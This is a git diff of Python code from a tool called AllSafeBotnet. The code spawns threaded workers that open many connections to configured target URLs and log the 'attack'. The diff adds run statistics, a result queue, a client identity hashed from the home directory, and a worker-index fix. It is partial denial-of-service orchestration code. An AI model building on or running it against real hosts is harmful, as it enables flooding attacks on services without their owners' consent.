@@ -5,13 +5,15 @@ using thread-based parallelism according to the features of their own running ma
 to handle multiple connection to the specified url.
 
 Created:    24 October 2016
-Modified:   30 December 2016
+Modified:   14 January 2017
 """
+
+import os
 
 from random import randint
 
 from threading import Thread
-from multiprocessing import Process
+from multiprocessing import Process, Queue
 
 from datetime import datetime, date
 from time import time, sleep as threadSleep
@@ -194,7 +196,7 @@ class AllSafeWorkerMaster():
             # and their log section 
             for s in range(0, self._targets[i]['sessions']):
                 self._workers_log[i + s] = []
-                worker = AllSafeWorker(i, "worker-t" + str(i) + "-s" + str(s), self._targets[i], self._workers_log[i])
+                worker = AllSafeWorker(i+s, "worker-t" + str(i) + "-s" + str(s), self._targets[i], self._workers_log[i+s])
                 # logging worker reference
                 logInfo(self._log, worker.getWorkerTarget())
                 self._workers.append(worker)
@@ -209,6 +211,9 @@ class AllSafeWorkerMaster():
         handling the final join operation.
         """
 
+        # recording start time
+        start_time = time()
+
         logInfo(self._log, "------------------- <STARTUP> -------------------")
 
         # iterating over workers to start them up
@@ -222,9 +227,18 @@ class AllSafeWorkerMaster():
         for worker_to_join in self._workers:
             worker_to_join.join()
         
+        # recording end time
+        end_time = time()
+
         # logging the attack
         logAttack(self._log, self._workers_log)
 
+        # retrieving statistics
+        return {
+            "targets" : len(self._targets),
+            "workers" : len(self._workers_log.keys()),
+            "timing"  : int(end_time - start_time)
+        }
 
 
 class AllSafeBotnet():
@@ -234,7 +248,14 @@ class AllSafeBotnet():
         it can be initialized and awaits to be called in order to transfer
         to another process an attack to be carried.
         """
-        self._attack_counter = 0
+        self._attack_counter  = 0
+        # initiliazing botnet client unique id
+        self._botnet_identity = str(hash(os.path.expanduser('~')))
+        # initializing queue 
+        self._botnet_queue    = Queue()
+        # initiaizling attack statistics
+        self._botnet_stats    = []
+
 
     def attack(self, configuration, override=False):
         """
@@ -242,21 +263,31 @@ class AllSafeBotnet():
         @param: configuration, string - path to the configuration file
         """
         self._attack_counter += 1
-        botnet = self.Botnet(configuration)
+        botnet = self.Botnet(configuration, self._botnet_queue)
         botnet.start()
+        # retrieving statistics and joining
+        attackstats = self._botnet_queue.get()
+        botnet.join()
+        # returning statistics
+        return attackstats
+
 
     class Botnet(Process):
-        def __init__(self, configuration, name='AllSafeBotnetInstance', override=False):
+        def __init__(self, configuration, queue, name='AllSafeBotnetInstance', override=False):
             super().__init__(name=name)
-            self._configuration = configuration
-            self._override_conf = override
+            self._queue          = queue
+            self._configuration  = configuration
+            self._override_conf  = override
             # initialize master
             self._allsafe_master = AllSafeWorkerMaster(self._configuration, override=self._override_conf)
 
         def run(self):
             # starting the attack
             self._allsafe_master.initializeWorkers()
-            self._allsafe_master.executeBotnet()
+            stat = self._allsafe_master.executeBotnet()
+            self._queue.put(stat)
+
+
         
 
 if __name__ == "__main__":
